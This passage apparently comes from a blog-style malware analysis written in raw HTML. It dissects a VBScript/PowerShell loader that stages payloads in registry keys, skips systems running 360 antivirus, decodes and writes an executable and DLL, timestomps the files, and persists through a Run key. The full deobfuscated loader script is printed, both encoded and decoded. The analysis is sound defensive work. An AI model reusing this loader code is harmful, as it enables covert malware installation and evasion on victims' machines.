oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">objWSS.RegWrite “HK”&amp;”CU\Softwa”&amp;”re\Updater\pa”&amp;”rt3&quot;, bnm, “REG_SZ”</p><p id="d378" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">here</p><p id="c2d0" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">tst = getProfile(“0”) &amp; “$c=”””&amp;c&amp;”””;$m=”””&amp;m&amp;”””;”&amp; Base64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\Softwa”&amp;”re\Updater\pa”&amp;”rt3&quot;)) &amp; getProfile(“1”)<br/>objWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” &amp; tst &amp; “”””, 0, true</p><p id="55e3" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and here:</p><p id="4cc1" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">objWSS.RegWrite “HKCU\Software\Updater”, “”<br/> objWSS.RegWrite “HKCU\Software\Updater\part1”, p1, “REG_SZ”<br/> objWSS.RegWrite “HKCU\Software\Updater\part2”, p2, “REG_SZ”</p><p id="b229" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The registry is used like pivot.</p><p id="1f87" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">p1, p2 and bnm are three blobs of base64 data.</p><p id="94f8" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">bdm decoded is:</p><blockquote class="pd pe pf"><p id="7ba3" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlOw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7DQoNCiRwbmFtZTM2ID0gIjMiICsgIjYwVHIiICsgImF5Ig0KJGJpbkRpciA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdLCAzNSkpKyAiXCIgKyAiV2luc2V0XENvbmZpZyIgKyAiXCI7DQokYmluID0gIldpbnNldC5leGUiOw0KdHJ5ew0KJGNtZExpbmUgPSAoW2ludF0kYykudG9TdHJpbmcoIjAwMDAwMDAwIikrKFtpbnRdJG0pLnRvU3RyaW5nKCIwMDAwMDAwMCIpOw0KJGNtZExpbmUgPSAkYmluKyAiICIgKyRjbWRMaW5lOw0KfQ0KY2F0Y2h7DQokY21kTGluZSA9ICRiaW47DQp9DQokbGluZSA9IG5ldy1vYmplY3QgYnl0ZVtdIDY0Ow0KJGJ1ZjYgPVtCeXRlW11dICgsMHgyMyAqIDY0KTsNCiRjYnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY21kTGluZSk7DQpbYXJyYXldOjpjb3B5KCRjYnl0ZXMsJGxpbmUsJGNieXRlcy5sZW5ndGgpOw0KDQokYmluUGF0aCA9ICRiaW5EaXIgKyAkYmluOw0KJGJpblBhdGhkbGwgPSAkYmluRGlyICsgImNtcGJrMzIuZGxsIjsNCiRkbXliaW5QYXRoID0gJGJpbkRpciArICJjbWRsMzIuZXhlIjsNCiRycGNkbGxwYXRoID0gJGJpbkRpciArICI1NzE0NkM5Ni5kbGwiOw0KJHJ1biA9ICdIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwnOw0KJHN5c3RlbSA9ICdIS0NVOlNvZnR3YXJlXFVwZGF0ZXInOw0KJHJ1bkV4aXN0cyA9IEZhbHNlOw0KJHBuYW1lYXZyID0gImF2IiArICJnbiIgKyAidCI7DQokbXN2YnZtZGxscGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxtc3Zidm02MC5kbGwiDQokY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxjbWRsMzIuZXhlIg0KDQokcTM2ID0gR2V0LVByb2Nlc3MgJHBuYW1lMzYgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7DQppZigkcTM2KXsNCglleGl0DQp9DQoNCmZ1bmN0aW9uIGRjKCRzKXsNCglzYWwgbiBOZXctT2JqZWN0Ow0KCSRkYXRhID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFBQUFBQUEiICsgJHMpOw0KCSRtcyA9IG4gU3lzdGVtLklPLk1lbW9yeVN0cmVhbTsNCgkkbXMuV3JpdGUoJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7DQoJJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsOw0KCXJldHVybiAobiBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKG4gU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJG1zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7DQp9Ow0KDQpmdW5jdGlvbiB1cGR0KCR0LCAkYil7DQoJKGxzICR0KS5MYXN0V3JpdGVUaW1lID0gIChscyAkYikuTGFzdFdyaXRlVGltZQ0KCShscyAkdCkuQ3JlYXRpb25UaW1lID0gKGxzICRiKS5DcmVhdGlvblRpbWUNCgkobHMgJHQpLkxhc3RBY2Nlc3NUaW1lID0gKGxzICRiKS5MYXN0QWNjZXNzVGltZQ0KfQ0KDQpmdW5jdGlvbiB3YjY0KCRwYXRoLCAkYjY0KXsNCgkkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJUVnEiICsgJGI2NCk7DQoJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCVtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkcGF0aCwkYnl0ZXMpIHwgT3V0LU51bGw7DQoJdXBkdCAtdCAkcGF0aCAtYiAkY21kbDMycGF0aA0KfQ0KDQpmdW5jdGlvbiBzYigkaCwgJG4gKSB7DQogICAgJGxlbiA9ICRuLmxlbmd0aDsNCiAgICAkbGltaXQgPSAkaC5sZW5ndGggLSAkbGVuOw0KICAgIEZvciggJGkgPSAwOyAgJGkgLWxlICRsaW1pdDsgICRpKysgKSB7DQogICAgICAgICRrID0gMDsNCiAgICAgICAgRm9yKCA7ICAkayAtbHQgJGxlbjsgICRrKysgKSB7DQogICAgICAgICAgICBpZiggJG5bJGtdIC1uZSAkaFskaSska10gKSB7YnJlYWt9Ow0KICAgICAgICB9DQogICAgICAgIGlmKCAkayAtZXEgJGxlbiApe3JldHVybiAkaX07DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0KaWYoKFRlc3QtUGF0aCAkZW52OldJTkRJUlxTeXNXT1c2NCkpew0KCSRtc3Zidm1kbGxwYXRoID0gJGVudjpXSU5ESVIgKyAiXFN5c1dPVzY0XG1zdmJ2bTYwLmRsbCINCgkkY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxTeXNXT1c2NFxjbWRsMzIuZXhlIg0KfQ0KDQp0cnl7DQoJaWYoIShUZXN0LVBhdGggJGJpblBhdGgpKXsNCg0KCQkkYjY0ID0gZGMgLXMgKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzeXN0ZW0pLnBhcnQxKTsNCgkJJGJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVFZxIiArICRiNjQpOw0KCQkkcm4gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKChHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTExMSkpWzAuLjFdOw0KCQlbYXJyYXldOjpjb3B5KCRybiwwLCRieXRlcywkYnl0ZXMubGVuZ3RoIC0gMiwyKTsNCgkJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCQlbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJGJpblBhdGgsJGJ5dGVzKSB8IE91dC1OdWxsOw0KCQl1cGR0IC10ICRiaW5QYXRoIC1iICRjbWRsMzJwYXRoDQoNCgkJJGI2NGRsbCA9IGRjIC1zICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkc3lzdGVtKS5wYXJ0Mik7DQogICAgICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlRWcSIgKyAkYjY0ZGxsKTsNCgkJW2FycmF5XTo6Y29weSgkbGluZSwwLCRieXRlcywoc2IgLWggJGJ5dGVzIC1uICRidWY2KSw2NCk7DQoJCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRiaW5EaXIgfCBPdXQtTnVsbDsNCgkJW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRiaW5QYXRoZGxsLCRieXRlcykgfCBPdXQtTnVsbDsNCgkJdXBkdCAtdCAkYmluUGF0aGRsbCAtYiAkY21kbDMycGF0aA0KCX0NCg0KCVJlbW92ZS1JdGVtIC1QYXRoICRzeXN0ZW0gfCBPdXQtTnVsbDsNCglSZW1vdmUtSXRlbSAkUFJPRklMRS5DdXJyZW50VXNlckFsbEhvc3RzIHwgT3V0LU51bGw7DQoJTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcnVuIC1OYW1lICJXaW5zb3VuZCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICRkbXliaW5QYXRoIHwgT3V0LU51bGw7DQoJDQoJQ29weS1JdGVtICAkbXN2YnZtZGxscGF0aCAkcnBjZGxscGF0aA0KCXVwZHQgLXQgJHJwY2RsbHBhdGggLWIgJG1zdmJ2bWRsbHBhdGgNCg0KCUNvcHktSXRlbSAkY21kbDMycGF0aCAkZG15YmluUGF0aA0KCXVwZHQgLXQgJGRteWJpblBhdGggLWIgJGNtZGwzMnBhdGgNCg0KCSRhdnIgPSBHZXQtUHJvY2VzcyAkcG5hbWVhdnIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCglpZiAoISRhdnIpIHsNCgkJJigkZG15YmluUGF0aCkgfCBPdXQtTnVsbDsNCgl9DQoJRXhpdA0KfQ0KY2F0Y2ggew0KCSRfLkV4Y2VwdGlvbi5NZXNzYWdlIHwgT3V0LU51bGw7DQp9&quot;””)))</p></blockquote><p id="3d63" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">There is a new base64 block decoded:</p><blockquote class="pd pe pf"><p id="7386" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force;<br/>$ErrorActionPreference=’SilentlyContinue’;</p><p id="818a" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$pname36 = “3” + “60Tr” + “ay”<br/>$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\” + “Winset\Config” + “\”;<br/>$bin = “Winset.exe”;<br/>try{<br/>$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);<br/>$cmdLine = $bin+ “ “ +$cmdLine;<br/>}<br/>catch{<br/>$cmdLine = $bin;<br/>}<br/>$line = new-object byte[] 64;<br/>$buf6 =[Byte[]] (,0x23 * 64);<br/>$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);<br/>[array]::copy($cbytes,$line,$cbytes.length);</p><p id="58ba" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$binPath = $binDir + $bin;<br/>$binPathdll = $binDir + “cmpbk32.dll”;<br/>$dmybinPath = $binDir + “cmdl32.exe”;<br/>$rpcdllpath = $binDir + “57146C96.dll”;<br/>$run = ‘HKCU:Software\Microsoft\Windows\CurrentVersion\Run\’;<br/>$system = ‘HKCU:Software\Updater’;<br/>$runExists = False;<br/>$pnameavr = “av” + “gn” + “t”;<br/>$msvbvmdllpath = $env:WINDIR + “\system32\msvbvm60.dll”<br/>$cmdl32path = $env:WINDIR + “\system32\cmdl32.exe”</p><p id="2203" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;<br/>if($q36){<br/> exit<br/>}</p><p id="4b28" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">function dc($s){<br/> sal n New-Object;<br/> $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);<br/> $ms = n System.IO.MemoryStream;<br/> $ms.Write($data, 0, $data.Length);<br/> $ms.Seek(0,0) | Out-Null;<br/> return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p><p id="f854" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">function updt($t, $b){<br/> (ls $t).LastWriteTime = (ls $b).LastWriteTime<br/> (ls $t).CreationTime = (ls $b).CreationTime<br/> (ls $t).LastAccessTime = (ls $b).LastAccessTime<br/>}</p><p id="2c33" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">function wb64($path, $b64){<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($path,$bytes) | Out-Null;<br/> updt -t $path -b $cmdl32path<br/>}</p><p id="0563" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">function sb($h, $n ) {<br/> $len = $n.length;<br/> $limit = $h.length — $len;<br/> For( $i = 0; $i -le $limit; $i++ ) {<br/> $k = 0;<br/> For( ; $k -lt $len; $k++ ) {<br/> if( $n[$k] -ne $h[$i+$k] ) {break};<br/> }<br/> if( $k -eq $len ){return $i};<br/> }<br/> return -1;<br/>}</p><p id="14bf" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">if((Test-Path $env:WINDIR\SysWOW64)){<br/> $msvbvmdllpath = $env:WINDIR + “\SysWOW64\msvbvm60.dll”<br/> $cmdl32path = $env:WINDIR + “\SysWOW64\cmdl32.exe”<br/>}</p><p id="d993" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">try{<br/> if(!(Test-Path $binPath)){</p><p id="b496" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$b64 = dc -s ((Get-ItemProperty -Path $system).part1);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];<br/> [array]::copy($rn,0,$bytes,$bytes.length — 2,2);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;<br/> updt -t $binPath -b $cmdl32path</p><p id="9d6a" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);<br/> [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;<br/> updt -t $binPathdll -b $cmdl32path<br/> }</p><p id="ca4f" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Remove-Item -Path $system | Out-Null;<br/> Remove-Item $PROFILE.CurrentUserAllHosts | Out-Null;<br/> New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;<br/> <br/> Copy-Item $msvbvmdllpath $rpcdllpath<br/> updt -t $rpcdllpath -b $msvbvmdllpath</p><p id="28b4" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Copy-Item $cmdl32path $dmybinPath<br/> updt -t $dmybinPath -b $cmdl32path</p><p id="737b" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue<br/> if (!$avr) {<br/> &amp;($dmybinPath) | Out-Null;<br/> }<br/> Exit<br/>}<br/>catch {<br/> $_.Exception.Message | Out-Null;<br/>}</p></blockquote><p id="dd52" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">This powershell checks if the AV 360 is installed:</p><blockquote class="pd pe pf"><p id="cc6b" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$pname36 = “3” + “60Tr” + “ay”</p><p id="fd7e" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;<br/>if($q36){<br/> exit<br/>}</p></blockquote><p id="6f46" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">We can imagine the attackers were made a recon step before.</p><p id="cfbc" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The folder where the loadin chain is:</p><blockquote class="pd pe pf"><p id="12ee" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\” + “Winset\Config” + “\”;</p></blockquote><p id="dd1f" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The powershell copies:</p><p id="7853" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$msvbvmdllpath = $env:WINDIR + “\system32\msvbvm60.dll”<br/>$cmdl32path = $env:WINDIR + “\system32\cmdl32.exe”</p><p id="805a" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Copy-Item $cmdl32path $dmybinPath</p><p id="b722" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Copy-Item $msvbvmdllpath $rpcdllpath</p><p id="ba77" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">So msvbvm60.dll becomes: 57146C96.dll</p><p id="64ed" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">And Winset.exe and cmpbk32.dll are decoded and copied in the same folder.</p><p id="4983" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">part1 and part2 is the reg key base here $system = ‘HKCU:Software\Updater’;:</p><p id="1042" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">objWSS.RegWrite “HKCU\Software\Updater”, “”<br/>objWSS.RegWrite “HKCU\Software\Updater\part1”, p1, “REG_SZ”<br/>objWSS.RegWrite “HKCU\Software\Updater\part2”, p2, “REG_SZ”</p><p id="a53d" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">part1 is big blob of base64 data.</p><p id="6308" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Firstly the registry key is retrieve:</p><p id="6384" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">(Get-ItemProperty -Path $system).part1</p><p id="1a64" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">after is the function dc is called.</p><blockquote class="pd pe pf"><p id="992c" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">function dc($s){<br/> sal n New-Object;<br/> $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);<br/> $ms = n System.IO.MemoryStream;<br/> $ms.Write($data, 0, $data.Length);<br/> $ms.Seek(0,0) | Out-Null;<br/> return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p></blockquote><p id="35c5" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">this string “H4sIAAAAAAA” is added at part2 and the data is decoded an</p><blockquote class="pd pe pf"><p id="2852" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);</p></blockquote><p id="ca52" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and unzip:</p><blockquote class="pd pe pf"><p id="5f3b" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p></blockquote><p id="ae1f" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and the Mz header in base64 is added and decoded:</p><blockquote class="pd pe pf"><p id="10e5" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);</p></blockquote><p id="762a" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and the executable is modified for the last time and copied in $binDir:</p><blockquote class="pd pe pf"><p id="442c" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];<br/> [array]::copy($rn,0,$bytes,$bytes.length — 2,2);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;</p></blockquote><p id="7639" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The dll is decoded, modified and written on disk in the same way:</p><blockquote class="pd pe pf"><p id="da3f" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);<br/> [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;<br/> updt -t $binPathdll -b $cmdl32path</p></blockquote><p id="bcfb" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The Trick very important here is : <strong class="nl gv">[array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); t</strong>o modify the dll.</p><p id="8d37" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">If you decode the before the modification you have a dll truncated.</p><p id="5f20" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">before:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on ph"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="371" loading="lazy" role="presentation"/></picture></div></div></figure><p id="c640" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">after:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on pi"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gskxEMV2wHIwHkcKEQu-NQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 